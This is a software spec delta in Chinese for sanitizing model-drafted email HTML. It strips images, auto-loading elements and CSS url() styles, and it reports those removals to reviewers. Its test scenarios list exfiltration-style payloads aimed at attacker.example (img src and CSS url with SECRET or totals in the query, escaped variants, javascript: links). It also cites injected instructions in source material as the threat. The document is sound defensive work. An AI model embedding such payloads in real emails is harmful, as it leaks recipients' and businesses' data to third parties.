# Spec Delta

## Purpose

规定模型起草的邮件 HTML（澄清邮件、销售跟进邮件）允许包含什么：图片与带地址的样式一律移除，使预览与收件人的邮件客户端都不会自动请求草稿里写的地址；同时规定预览与发出的正文一致、移除时告诉审核人什么、规则覆盖哪些入口。

## ADDED Requirements

### Requirement: 邮件草稿里没有图片与其它自动加载资源的元素
经规范化的邮件草稿 HTML SHALL NOT 含图片元素，SHALL NOT 含任何会让浏览器或邮件客户端不经用户操作就请求某个地址的元素（图片、媒体、内嵌框架、对象、样式表、脚本、矢量图等）。指向外部主机的、协议相对的、指向站内路径的地址 SHALL 同样处理，没有例外清单。未闭合、属性值里夹尖括号、藏在注释里的变形写法 SHALL NOT 产生上述元素。

#### Scenario: 外部图片
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化 `<p>Dear Owner,</p><img src="https://attacker.example/p.png?d=SECRET" alt="logo">`
- **THEN** 结果里没有 `<img`，没有 `attacker.example`，没有 `SECRET`；`<p>Dear Owner,</p>` 保留

#### Scenario: 协议相对地址与站内地址
- **WHEN** 同一测试规范化 `<img src="//attacker.example/a.png">` 与 `<img src="/api/auth/logout">`
- **THEN** 两个结果里都没有 `<img`，也没有 `src=`

#### Scenario: 变形写法
- **WHEN** 同一测试规范化未闭合的 `<img src="https://attacker.example/u.png"`、属性里夹尖括号的 `<img alt="a>b" src="https://attacker.example/g.png">`、藏在注释里的 `<!--><img src="https://attacker.example/c.png">-->`
- **THEN** 每个结果里都没有以 `<img` 开头的标签；未闭合的那一段以转义后的文字出现

#### Scenario: 其它会加载资源的元素
- **WHEN** 同一测试规范化分别含 `<style>`、`<link>`、`<script>`、`<svg><image href=…>`、`<iframe>`、`<video poster=…>`、`<object>`、`<embed>`、`<input type="image">` 的输入，以及带 `background` 属性的 `<table>`
- **THEN** 每个结果里都没有这些标签，没有 `background=` 属性，`<style>` 与 `<script>` 里的内容也不以文字出现

### Requirement: 样式里没有带地址的声明
经规范化的邮件草稿 HTML 里，`style` 属性 SHALL 只保留允许清单内的排版属性，其取值 SHALL 只由字母、数字、空格与少量标点组成，取值里的函数 SHALL 只允许颜色与线性渐变函数。带 `url(…)`、`image-set(…)`、反斜杠转义、引号字符串或冒号的声明 SHALL 整条移除；同一 `style` 里其余合格的声明 SHALL 保留。

#### Scenario: 各类带地址的属性
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化 `style` 分别为 `background:url(https://attacker.example/b?d=SECRET)`、`background-image:url('…')`、`list-style-image:url(…)`、`border-image:url(…) 1`、`cursor:url(…),auto`、`content:url(…)`、`background:#fff url(…) no-repeat` 的元素
- **THEN** 每个结果里都没有 `url(`，没有 `attacker.example`

#### Scenario: 不写 url 的写法
- **WHEN** 同一测试规范化 `style="background-image:image-set('https://attacker.example/i.png' 1x)"`、`style="background:\75rl(https://attacker.example/e.png)"`、`style="background:&#117;rl(https://attacker.example/n.png)"`、不带引号的 `style=background:url(https://attacker.example/q.png)`
- **THEN** 每个结果里都没有 `attacker.example`，没有 `image-set`，没有反斜杠

#### Scenario: 同一 style 里合格的声明保留
- **WHEN** 同一测试规范化 `<div style="border:4px solid;border-image:url(https://attacker.example/b.png) 1;color:#333">x</div>`
- **THEN** 结果是 `<div style="border:4px solid;color:#333">x</div>`

### Requirement: 正常草稿与现有版式不变
规范化 SHALL NOT 改变不含图片、不含带地址样式的正常草稿的内容与样式：销售跟进邮件现有的品牌版式、五个降级模板、提示词要求模型使用的标签（段落、换行、列表、加粗、标题、表格）SHALL 原样保留，只允许空白与等价写法上的差异。对已经规范化过的 HTML 再做一次规范化，结果 SHALL 与输入逐字相同。

#### Scenario: 品牌版式与降级模板
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，把五个降级模板各自套上品牌版式后规范化
- **THEN** 去掉空白、声明末尾分号与 `<br/>` / `<br>` 写法差异后，每个结果与输入逐字相同，被移除的内容为零处

#### Scenario: 提示词要求的标签
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化 `<p>Hello,</p><ul><li><strong>Item</strong> one</li></ul><p>Regards,<br>Sam</p>`
- **THEN** 结果与输入逐字相同

#### Scenario: 再做一次结果不变
- **WHEN** 同一测试对全部用例的结果再规范化一次
- **THEN** 每个结果与第一次的结果逐字相同

### Requirement: 链接保留且只允许三种协议
邮件草稿里的链接 SHALL 保留并保持可点击，链接地址 SHALL 只允许 `http`、`https`、`mailto` 三种协议。其它协议的链接（`javascript:`、`data:` 等）SHALL 去掉链接地址、保留链接文字。

#### Scenario: 正常链接
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化 `<a href="https://qingyan.ai/quote/abc">View Your Quote</a>` 与 `<a href="mailto:owner@example.com">owner@example.com</a>`
- **THEN** 两个结果里 `href` 不变

#### Scenario: 不允许的协议
- **WHEN** 同一测试规范化 `<a href="javascript:alert(1)">x</a>` 与 `<a href="data:text/html,…">y</a>`
- **THEN** 两个结果里都没有 `href`，文字 `x`、`y` 保留

### Requirement: 生成出口返回并保存规范化后的正文
澄清邮件生成（`POST /api/projects/[id]/questions`）、跟进邮件生成（`POST /api/sales/email-compose`）、跟进邮件改写（`POST /api/sales/email-compose?action=refine`）SHALL 对模型产出的正文做规范化，返回的正文与保存的正文 SHALL 都是规范化之后的。模型调用失败时使用的降级模板 SHALL 走同一规范化。

#### Scenario: 三个生成出口都经过规范化
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，对三个生成出口的源码做断言
- **THEN** 三处在返回与保存正文之前都经过同一规范化规则；任何一处绕开时测试失败并指出文件

#### Scenario: 模型写进外部图片的草稿
- **WHEN** 同一测试把模型产出 `<p>Hi Jane,</p><img src="https://attacker.example/t.gif?total=1234.00">` 交给跟进邮件的正文装配步骤
- **THEN** 装配出的正文里有品牌版式与 `<p>Hi Jane,</p>`，没有 `<img`，没有 `attacker.example`

### Requirement: 生成接口报告被移除的内容
三个生成接口的响应 SHALL 带字段 `removedAutoLoad`，形状固定为 `{ count, hosts }`：`count` 是被移除的自动加载内容的处数（图片及其它加载资源的元素、带地址或带不允许函数的样式声明），`hosts` 是这些内容涉及的主机名，去重、小写、至多 5 个。没有移除时 SHALL 返回 `{ count: 0, hosts: [] }`。因不在允许清单而被去掉、但本身不加载任何地址的标签或样式（如 `<font>`、`position:absolute`）SHALL NOT 计入。

#### Scenario: 有移除
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化同时含 `<img src="https://attacker.example/a.png">` 与 `style="background:url(//Tracker.Example/b)"` 的输入并取报告
- **THEN** 报告是 `{ count: 2, hosts: ["attacker.example", "tracker.example"] }`

#### Scenario: 没有移除与不计入的移除
- **WHEN** 同一测试规范化 `<p>Hello</p>` 与 `<font color="red">Hi</font><div style="position:absolute">x</div>`
- **THEN** 两个报告都是 `{ count: 0, hosts: [] }`

#### Scenario: 接口带上字段
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，对三个生成出口的源码做断言
- **THEN** 三个接口的成功响应都带 `removedAutoLoad`

### Requirement: 移除报告不带出地址内容
`removedAutoLoad`、预览里的提示、审计记录 SHALL NOT 含被移除地址的路径、查询串或片段，SHALL NOT 含被移除内容的原文。澄清邮件生成的审计记录 SHALL 带上与响应相同的 `removedAutoLoad`。

#### Scenario: 只有主机名
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，规范化 `<img src="https://attacker.example/p.png?total=1234.00&token=SECRET#frag">` 并取报告与提示文字
- **THEN** 报告与提示文字里有 `attacker.example`，没有 `p.png`、`1234.00`、`SECRET`、`frag`

#### Scenario: 审计记录带上报告
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，对澄清邮件生成出口的源码做断言
- **THEN** 该出口写入的审计记录内容里带 `removedAutoLoad`

### Requirement: 发送出口发出规范化后的正文
澄清邮件发送（`POST /api/projects/[id]/questions/[questionId]/send`）与跟进邮件发送（`POST /api/sales/email-compose?action=send-approved`）SHALL 对收到的正文做同一规范化，交给邮箱发出的正文与保存到发信记录里的正文 SHALL 都是规范化之后的。两个接口既有的校验、拒绝条件、响应形状 SHALL 不变。

#### Scenario: 两个发送出口都经过规范化
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，对两个发送出口的源码做断言
- **THEN** 两处在调用发信与写入发信记录之前都经过同一规范化规则，且发出的与保存的是同一个规范化结果

#### Scenario: 直接向发送接口提交带图片的正文
- **WHEN** 同一测试把 `<p>Hi</p><img src="https://attacker.example/x.gif">` 交给发送出口使用的正文处理步骤
- **THEN** 得到的待发正文是 `<p>Hi</p>`

### Requirement: 预览与发出的正文一致且不产生加载
澄清邮件对话框与销售行动队列的跟进邮件审阅 SHALL 显示规范化之后的正文，即点「发送」后发出的那一份。预览 SHALL NOT 生成图片元素，SHALL NOT 生成任何会让浏览器不经用户操作就请求草稿里地址的元素或样式。

#### Scenario: AI 起草的正文含外部图片与 CSS url()
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，把 `<p>Hi</p><img src="https://attacker.example/i.gif?d=SECRET"><p style="background:url(https://attacker.example/b?d=SECRET)">text</p>` 交给两处预览共用的预览入口
- **THEN** 预览 HTML 是 `<p>Hi</p><p>text</p>`：没有 `<img`、没有 `url(`、没有 `attacker.example`

#### Scenario: 预览与发送用同一个结果
- **WHEN** 同一测试把同一段正文分别交给预览入口与发送出口的正文处理步骤
- **THEN** 两个结果逐字相同

#### Scenario: 预览净化规则不再放行图片
- **WHEN** 同一测试对预览净化规则的源码做断言
- **THEN** 允许的标签里没有 `img`，允许的属性里没有 `src`

#### Scenario: 真实浏览器里没有请求
- **WHEN** 设了 `CHROME_EXECUTABLE_PATH` 并运行 `npx tsx scripts/email-draft-preview-browser-e2e.ts`，草稿正文含外部图片、协议相对图片、站内路径图片、`style` 里的 `url(…)`、`image-set(…)`、CSS 转义写法与 HTML 实体写法
- **THEN** 按预览规则放进页面、以及当作整封邮件直接打开，浏览器都没有发出任何请求，脚本以 0 退出

#### Scenario: 没有浏览器时跳过
- **WHEN** 没设 `CHROME_EXECUTABLE_PATH` 时运行同一脚本
- **THEN** 打印一行以 `SKIP` 标明的说明并以 0 退出

#### Scenario: 改动前的对照
- **WHEN** 设了 `CHROME_EXECUTABLE_PATH` 并以 `--before` 运行同一脚本（改动前的预览净化规则、不做规范化）
- **THEN** 输出里列出浏览器发出的请求，条数大于零

### Requirement: 预览告诉审核人移除了什么
预览里的正文被移除过自动加载内容时（生成接口报告的，或预览时对当前正文再规范化得到的），预览 SHALL 在正文上方显示一行提示：「已移除 N 处会自动加载外部地址的内容（主机名）。发出的邮件与此预览一致；资料里可能夹带了指令，请核对正文后再发送。」没有主机名时 SHALL 省掉括号。没有移除时 SHALL NOT 显示提示。提示 SHALL NOT 写进邮件正文。

#### Scenario: 提示文字
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，以 `{ count: 2, hosts: ["attacker.example"] }` 与 `{ count: 1, hosts: [] }` 取提示文字
- **THEN** 第一条含「已移除 2 处」与「（attacker.example）」；第二条含「已移除 1 处」，没有空括号

#### Scenario: 没有移除
- **WHEN** 同一测试以 `{ count: 0, hosts: [] }` 取提示文字
- **THEN** 得到空值

#### Scenario: 两处预览都显示提示
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，对两处预览的源码做断言
- **THEN** 两处都用同一个提示文字来源，提示渲染在正文预览之外

### Requirement: 没有绕开规则的 HTML 预览
仓库里 SHALL NOT 存在绕开本能力的规则、把模型起草的邮件 HTML 直接放进页面的预览。把 HTML 字符串直接放进页面的源文件 SHALL 限于一份登记清单：两处邮件预览（都经过统一的预览入口）、根布局里的主题启动脚本、分析备忘卡（服务端受限渲染、全转义）。

#### Scenario: 登记清单之外没有新增
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/wiring.test.ts`，扫描 `src/` 下全部 `.ts` / `.tsx` 源文件（测试文件除外）
- **THEN** 把 HTML 字符串直接放进页面的文件只有登记清单里的四个；多出一个时测试失败并列出文件路径

#### Scenario: 两处邮件预览都走统一入口
- **WHEN** 同一测试对两处邮件预览的源码做断言
- **THEN** 两处放进页面的 HTML 都来自统一的预览入口，没有直接使用草稿原文

### Requirement: 规则是确定性的且不可关闭
本能力的规范化 SHALL NOT 调用模型，SHALL NOT 发起网络请求，SHALL NOT 依赖环境变量、开关或组织设置：同一段输入在任何组织、任何用户、服务端与浏览器端得到同一结果。本能力 SHALL NOT 修改任何提示词，SHALL NOT 改变两条发信路径的触发方式、权限与收件人。

#### Scenario: 判定不读环境
- **WHEN** 运行 `npx tsx src/lib/email-draft-html/__tests__/normalize.test.ts`，对规范化模块的源码做断言
- **THEN** 其中没有对 `process.env`、`window`、`document`、`fetch` 的引用，也没有引入任何其它模块

#### Scenario: 提示词与数据结构无改动
- **WHEN** 在仓库根运行 `git diff --stat main -- prisma vercel.json next.config.ts src/proxy.ts src/lib/ai/prompts package.json package-lock.json`
- **THEN** 输出为空
